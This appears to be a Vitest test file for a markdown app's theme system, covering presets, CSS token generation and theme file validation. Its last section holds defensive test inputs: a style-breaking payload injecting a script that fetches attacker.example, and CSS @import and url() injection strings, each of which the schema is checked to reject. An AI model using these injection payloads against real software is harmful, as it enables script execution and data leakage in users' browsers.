import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";

import {
  applyTheme,
  componentAttributes,
  docTokens,
  mermaidThemeVariables,
  viewTokens,
  type DocView,
} from "./apply";
import { toHex } from "./color";
import { DEFAULT_PRESET_ID, PRESETS, findPreset, resolveTheme } from "./presets";
import { ThemeFileSchema, ThemeSchema, type Theme } from "./schema";
import { HOUSE_THEMES } from "./shiki-house";

const house = findPreset("house")!;

describe("presets", () => {
  it("every half of every preset satisfies the schema", () => {
    for (const preset of PRESETS) {
      for (const half of ["light", "dark"] as const) {
        const result = ThemeSchema.safeParse(preset[half]);
        expect(
          result.success,
          `${preset.id}.${half}: ${JSON.stringify(result.error?.issues)}`,
        ).toBe(true);
      }
    }
  });

  it("declares the appearance that matches the half it is filed under", () => {
    for (const preset of PRESETS) {
      expect(preset.light.appearance, preset.id).toBe("light");
      expect(preset.dark.appearance, preset.id).toBe("dark");
    }
  });

  it("gives every theme a unique id", () => {
    const ids = PRESETS.flatMap((p) => [p.light.id, p.dark.id]);
    expect(new Set(ids).size).toBe(ids.length);
  });

  it("ships the default preset", () => {
    expect(findPreset(DEFAULT_PRESET_ID)).toBeDefined();
  });

  it("names a Shiki theme that is either House's own or a bundled id", () => {
    // A typo here would silently fall back to plain text at runtime, which looks
    // like "highlighting is broken" rather than "the theme id is wrong".
    const bundled = new Set([
      "github-light",
      "github-dark",
      "github-light-default",
      "github-dark-dimmed",
      "github-light-high-contrast",
      "github-dark-high-contrast",
      "solarized-light",
      "solarized-dark",
      "nord",
      "dracula",
      "one-light",
      "one-dark-pro",
      "tokyo-night",
      "catppuccin-latte",
      "catppuccin-mocha",
      "gruvbox-light-medium",
      "gruvbox-dark-medium",
      "rose-pine",
      "rose-pine-dawn",
      "everforest-light",
      "everforest-dark",
      "vitesse-light",
      "vitesse-dark",
    ]);

    for (const preset of PRESETS) {
      for (const half of ["light", "dark"] as const) {
        const id = preset[half].code.shikiTheme;
        expect(
          bundled.has(id) || id in HOUSE_THEMES,
          `${preset.id}.${half} names unknown shiki theme "${id}"`,
        ).toBe(true);
      }
    }
  });

  it("keeps every color non-empty, so no token can resolve to nothing", () => {
    for (const preset of PRESETS) {
      for (const half of ["light", "dark"] as const) {
        for (const [key, value] of Object.entries(docTokens(preset[half]))) {
          expect(value.trim(), `${preset.id}.${half} ${key}`).not.toBe("");
        }
      }
    }
  });
});

describe("resolveTheme", () => {
  it("returns the half matching the appearance", () => {
    expect(resolveTheme("house", "light").id).toBe(house.light.id);
    expect(resolveTheme("house", "dark").id).toBe(house.dark.id);
  });

  it("prefers a custom theme with the same id", () => {
    const custom: Theme = { ...house.light, id: "mine", name: "Mine" };
    expect(resolveTheme("mine", "light", [custom])).toBe(custom);
  });

  it("falls back to the default rather than throwing on an unknown id", () => {
    // A config naming a theme the user deleted must not leave a blank window.
    expect(resolveTheme("deleted-theme", "dark").id).toBe(house.dark.id);
  });
});

describe("docTokens", () => {
  it("emits only --doc-* properties", () => {
    for (const key of Object.keys(docTokens(house.light))) {
      expect(key.startsWith("--doc-"), key).toBe(true);
    }
  });

  it("derives heading sizes from the theme's own scale", () => {
    const tokens = docTokens(house.light);
    const sizes = [1, 2, 3, 4, 5, 6].map((n) => parseFloat(tokens[`--doc-h${n}`]!));

    // Monotonically decreasing, h1 clearly larger than body, h6 just under it.
    for (let i = 1; i < sizes.length; i++) {
      expect(sizes[i]!, `h${i + 1} vs h${i}`).toBeLessThan(sizes[i - 1]!);
    }
    expect(sizes[0]!).toBeGreaterThan(1.5);
    expect(sizes[5]!).toBeLessThan(1);
  });

  it("responds to the scale: a flat scale flattens the hierarchy", () => {
    const flat = docTokens({
      ...house.light,
      typography: { ...house.light.typography, scale: 1 },
    });
    expect(parseFloat(flat["--doc-h1"]!)).toBe(1);
    expect(parseFloat(flat["--doc-h6"]!)).toBe(1);
  });

  it("carries units so the values are usable as CSS", () => {
    const tokens = docTokens(house.light);
    expect(tokens["--doc-size"]).toMatch(/px$/);
    expect(tokens["--doc-measure"]).toMatch(/ch$/);
    expect(tokens["--doc-para-space"]).toMatch(/em$/);
    expect(tokens["--doc-tracking"]).toMatch(/em$/);
    // Unitless on purpose — line-height with a unit does not inherit correctly.
    expect(tokens["--doc-leading"]).not.toMatch(/[a-z]/);
  });

  it("maps justify onto a text-align value", () => {
    const typography = house.light.typography;
    expect(docTokens(house.light)["--doc-align"]).toBe("start");
    expect(
      docTokens({ ...house.light, typography: { ...typography, justify: true } })["--doc-align"],
    ).toBe("justify");
  });
});

describe("the page and the measure", () => {
  const view = (patch: Partial<DocView> = {}): DocView => ({
    zoom: 1,
    contentWidth: "standard",
    ...patch,
  });

  it("gives the page the measure at standard, and more at wide and full", () => {
    expect(viewTokens(view())["--doc-page"]).toBe("var(--doc-measure)");
    expect(viewTokens(view({ contentWidth: "wide" }))["--doc-page"]).toBe(
      "calc(var(--doc-measure) * 1.5)",
    );
    expect(viewTokens(view({ contentWidth: "full" }))["--doc-page"]).toBe("100%");
  });

  it("gives each setting its own width, so all three are distinguishable", () => {
    const widths = (["standard", "wide", "full"] as const).map(
      (contentWidth) => viewTokens(view({ contentWidth }))["--doc-page"],
    );
    expect(new Set(widths).size).toBe(widths.length);
  });

  it("keeps the view out of the theme's own tokens", () => {
    // A theme file must not be able to carry someone else's window width, for
    // the same reason it cannot carry their zoom.
    const tokens = docTokens(house.light);
    for (const property of Object.keys(viewTokens(view()))) {
      expect(tokens, property).not.toHaveProperty(property);
    }
  });
});

describe("structural tokens", () => {
  const withType = (patch: Partial<Theme["typography"]>) =>
    docTokens({
      ...house.light,
      typography: { ...house.light.typography, ...patch },
    });

  const withLayout = (patch: Partial<Theme["layout"]>) =>
    docTokens({ ...house.light, layout: { ...house.light.layout, ...patch } });

  it("lets an indent replace the blank line rather than adding to it", () => {
    const spaced = withType({ paragraphStyle: "spaced" });
    expect(spaced["--doc-indent"]).toBe("0em");
    expect(parseFloat(spaced["--doc-para-space"]!)).toBeGreaterThan(0);

    const indented = withType({ paragraphStyle: "indented" });
    expect(parseFloat(indented["--doc-indent"]!)).toBeGreaterThan(0);
    expect(parseFloat(indented["--doc-para-space"]!)).toBe(0);
  });

  it("maps the three link-underline settings onto rest and hover", () => {
    const at = (linkUnderline: Theme["typography"]["linkUnderline"]) => {
      const tokens = withType({ linkUnderline });
      return [tokens["--doc-link-underline"], tokens["--doc-link-underline-hover"]];
    };
    expect(at("always")).toEqual(["underline", "underline"]);
    expect(at("hover")).toEqual(["none", "underline"]);
    expect(at("never")).toEqual(["none", "none"]);
  });

  it("tightens table padding on the compact density", () => {
    const table = house.light.layout.table;
    const comfortable = withLayout({ table: { ...table, density: "comfortable" } });
    const compact = withLayout({ table: { ...table, density: "compact" } });

    expect(parseFloat(compact["--doc-table-pad-block"]!)).toBeLessThan(
      parseFloat(comfortable["--doc-table-pad-block"]!),
    );
    expect(parseFloat(compact["--doc-table-pad-inline"]!)).toBeLessThan(
      parseFloat(comfortable["--doc-table-pad-inline"]!),
    );
  });

  it("draws vertical rules only for a grid, and pads the last column with them", () => {
    const table = house.light.layout.table;
    const hairline = withLayout({ table: { ...table, rules: "hairline" } });
    expect(hairline["--doc-table-rule"]).toBe("transparent");
    // Flush to the text edge, which is what makes a hairline table read as part
    // of the page rather than as a box on it.
    expect(hairline["--doc-table-pad-last"]).toBe("0px");

    const grid = withLayout({ table: { ...table, rules: "grid" } });
    expect(grid["--doc-table-rule"]).not.toBe("transparent");
    expect(grid["--doc-table-pad-last"]).not.toBe("0px");
  });

  it("resolves the stripe to transparent when it is off, never to nothing", () => {
    // An empty value would make the row inherit whatever came before it.
    const table = house.light.layout.table;
    expect(withLayout({ table: { ...table, zebra: false } })["--doc-table-stripe"]).toBe(
      "transparent",
    );
    expect(withLayout({ table: { ...table, zebra: true } })["--doc-table-stripe"]).not.toBe(
      "transparent",
    );
  });

  it("maps hyphenation and code wrapping onto their CSS values", () => {
    expect(withType({ hyphenate: true })["--doc-hyphens"]).toBe("auto");
    expect(withType({ hyphenate: false })["--doc-hyphens"]).toBe("manual");

    const wrapped = docTokens({
      ...house.light,
      code: { ...house.light.code, wrap: true },
    });
    expect(docTokens(house.light)["--doc-code-wrap"]).toBe("pre");
    expect(wrapped["--doc-code-wrap"]).toBe("pre-wrap");
  });
});

describe("applyTheme", () => {
  it("writes every token onto the target element", () => {
    const element = document.createElement("div");
    applyTheme(house.dark, element);

    for (const [property, value] of Object.entries(docTokens(house.dark))) {
      expect(element.style.getPropertyValue(property), property).toBe(value);
    }
  });

  it("records the appearance so the canvas can match native controls", () => {
    const element = document.createElement("div");
    applyTheme(house.dark, element);
    expect(element.dataset.appearance).toBe("dark");
    expect(element.style.colorScheme).toBe("dark");
  });

  it("replaces the previous theme's values rather than layering on them", () => {
    const element = document.createElement("div");
    applyTheme(house.dark, element);
    applyTheme(house.light, element);
    expect(element.style.getPropertyValue("--doc-bg")).toBe(house.light.colors.bg);
    expect(element.dataset.appearance).toBe("light");
  });

  it("scales the base size by the reader's zoom", () => {
    const element = document.createElement("div");
    applyTheme(house.light, element, { zoom: 1.5 });
    expect(element.style.getPropertyValue("--doc-size")).toBe(
      `${house.light.typography.baseSize * 1.5}px`,
    );
  });

  it("leaves zoom out of docTokens, so an export keeps the theme's own size", () => {
    // Zoom is a property of the reader's view, not of the theme. A document
    // exported while zoomed in must not carry that zoom into the file.
    const element = document.createElement("div");
    applyTheme(house.light, element, { zoom: 2 });

    expect(docTokens(house.light)["--doc-size"]).toBe(`${house.light.typography.baseSize}px`);
    expect(element.style.getPropertyValue("--doc-size")).not.toBe(
      docTokens(house.light)["--doc-size"],
    );
  });

  it("writes the reader's width onto the element without touching the theme", () => {
    const element = document.createElement("div");
    applyTheme(house.light, element, { contentWidth: "full" });
    expect(element.style.getPropertyValue("--doc-page")).toBe("100%");
    expect(house.light.typography.measure).toBe(66);
  });

  it("defaults to a standard-width page when no view is given", () => {
    const element = document.createElement("div");
    applyTheme(house.light, element);
    expect(element.style.getPropertyValue("--doc-page")).toBe("var(--doc-measure)");
  });

  it("records heading numbering, which counters cannot express as a token", () => {
    const element = document.createElement("div");
    applyTheme(house.light, element);
    expect(element.dataset.headingNumbers).toBe("false");

    applyTheme(
      { ...house.light, layout: { ...house.light.layout, numberHeadings: true } },
      element,
    );
    expect(element.dataset.headingNumbers).toBe("true");
  });

  it("never writes a --ui-* property", () => {
    // The rule that makes Studio Rail work: a theme cannot reach the chrome.
    const element = document.createElement("div");
    applyTheme(house.dark, element);
    for (let i = 0; i < element.style.length; i++) {
      expect(element.style.item(i).startsWith("--ui-")).toBe(false);
    }
  });
});

describe("mermaidThemeVariables", () => {
  it("draws its palette from the theme, so diagrams recolor with the page", () => {
    // Compared through `toHex` because Mermaid is handed hex, not the authored
    // colour — it cannot parse oklch. See lib/theme/color.ts.
    const vars = mermaidThemeVariables(house.dark);
    expect(vars.background).toBe(toHex(house.dark.colors.bg));
    expect(vars.textColor).toBe(toHex(house.dark.colors.text));
    expect(vars.lineColor).toBe(toHex(house.dark.colors.textMuted));
  });

  it("differs between the light and dark halves of the same preset", () => {
    expect(mermaidThemeVariables(house.light)).not.toEqual(mermaidThemeVariables(house.dark));
  });
});

describe("theme files", () => {
  it("round-trips a theme through the export format", () => {
    const file = { format: "lindo-md-theme", version: 1, theme: house.light };
    const parsed = ThemeFileSchema.parse(JSON.parse(JSON.stringify(file)));
    expect(parsed.theme).toEqual(house.light);
  });

  it("rejects a file that is not a lindo-md theme", () => {
    expect(ThemeFileSchema.safeParse({ theme: house.light }).success).toBe(false);
    expect(
      ThemeFileSchema.safeParse({
        format: "something-else",
        version: 1,
        theme: house.light,
      }).success,
    ).toBe(false);
  });

  it("rejects a theme with a color missing", () => {
    const broken = JSON.parse(JSON.stringify(house.light));
    delete broken.colors.link;
    expect(ThemeSchema.safeParse(broken).success).toBe(false);
  });

  it("imports a file exported before the structural settings existed", () => {
    // The promise the version field makes: a theme someone shared last year
    // still opens, with the new settings at their defaults.
    const old = JSON.parse(JSON.stringify(house.light));
    delete old.layout;
    delete old.code.wrap;
    delete old.typography.hyphenate;
    delete old.typography.paragraphStyle;
    delete old.typography.linkUnderline;

    const parsed = ThemeSchema.parse(old);
    expect(parsed.layout.table.rules).toBe("hairline");
    expect(parsed.layout.numberHeadings).toBe(false);
    expect(parsed.code.wrap).toBe(false);
    expect(parsed.typography.hyphenate).toBe(true);
    expect(parsed.typography.paragraphStyle).toBe("spaced");
    expect(parsed.typography.linkUnderline).toBe("always");
  });

  it("rejects typography outside the readable range", () => {
    const tooSmall = {
      ...house.light,
      typography: { ...house.light.typography, baseSize: 4 },
    };
    expect(ThemeSchema.safeParse(tooSmall).success).toBe(false);
  });
});

describe("the two token namespaces stay apart", () => {
  // DESIGN.md's structural rule, enforced rather than trusted: the chrome must
  // not read the paper's tokens, and the document stylesheet must not read the
  // tool's. Checked against the stylesheet source because that is where a
  // violation would actually be written.
  const css = readFileSync("src/styles.css", "utf8");

  it("defines both namespaces in styles.css", () => {
    expect(css).toContain("--ui-base:");
    expect(css).toContain("--doc-bg:");
  });

  it("gives styles.css a House default for every token applyTheme writes", () => {
    // Otherwise a token would fall back to nothing before React mounts, and the
    // first paint would be subtly wrong in a way that is hard to spot.
    const written = {
      ...docTokens(house.light),
      ...viewTokens({ zoom: 1, contentWidth: "standard" }),
    };
    for (const property of Object.keys(written)) {
      // Heading sizes are computed per theme, not defaulted in CSS.
      if (/^--doc-h\d$/.test(property)) continue;
      expect(css, `${property} has no default in styles.css`).toContain(`${property}:`);
    }
  });

  it("gives index.html a House default for every component attribute", () => {
    // The same first-paint rule as the tokens above, and a sharper one: a token
    // that is missing falls back to the House value in styles.css, but an
    // attribute that is missing matches no rule at all — a quotation would paint
    // with no bar, a code block with no card, until React mounts.
    const html = readFileSync("index.html", "utf8");
    for (const [attribute, value] of Object.entries(componentAttributes(house.light))) {
      expect(html, `${attribute} is not defaulted in index.html`).toContain(
        `${attribute}="${value}"`,
      );
    }
  });
});

describe("theme values as CSS", () => {
  /**
   * A theme is a file people share, so it is untrusted input. `applyTheme` is safe
   * on its own — `setProperty` goes through CSSOM — but the HTML exporter writes the
   * same tokens as *text* into a literal `<style>`, which is a raw-text element: the
   * tokenizer ends it at the first `</style`.
   */
  const hostile = "#fff</style><script>fetch('https://attacker.example')</script>";

  function withColor(value: string) {
    const base = structuredClone(house.light);
    base.colors.bg = value;
    return base;
  }

  it("refuses a colour that closes the style element", () => {
    const result = ThemeSchema.safeParse(withColor(hostile));
    expect(result.success).toBe(false);
  });

  it.each([
    ["a semicolon, ending the declaration", "#fff; background: red"],
    ["braces, closing the rule", "#fff} body { display: none"],
    ["an at-rule", "@import 'https://attacker.example/x.css'"],
    ["url(), which also fetches", "url(https://attacker.example/pixel.png)"],
    ["a comment, swallowing what follows", "#fff /* "],
  ])("refuses %s", (_label, value) => {
    expect(ThemeSchema.safeParse(withColor(value)).success).toBe(false);
  });

  it.each([
    ["oklch, how the presets are authored", "oklch(0.72 0.11 253)"],
    ["hex", "#a3b1c6"],
    ["rgb with commas", "rgb(163, 177, 198)"],
    ["a var() reference", "var(--doc-accent)"],
    ["a colour keyword", "rebeccapurple"],
  ])("still accepts %s", (_label, value) => {
    expect(ThemeSchema.safeParse(withColor(value)).success).toBe(true);
  });

  it("still accepts a real font stack, quotes and commas and all", () => {
    const theme = structuredClone(house.light);
    theme.typography.bodyFont = '"IBM Plex Sans", -apple-system, Segoe UI, sans-serif';
    expect(ThemeSchema.safeParse(theme).success).toBe(true);
  });

  it("refuses a font family that closes the style element", () => {
    const theme = structuredClone(house.light);
    theme.typography.bodyFont = hostile;
    expect(ThemeSchema.safeParse(theme).success).toBe(false);
  });

  it("rejects the hostile theme as a whole theme file, which is how it would arrive", () => {
    const file = { format: "lindo-md-theme", version: 1, theme: withColor(hostile) };
    expect(ThemeFileSchema.safeParse(file).success).toBe(false);
  });
});
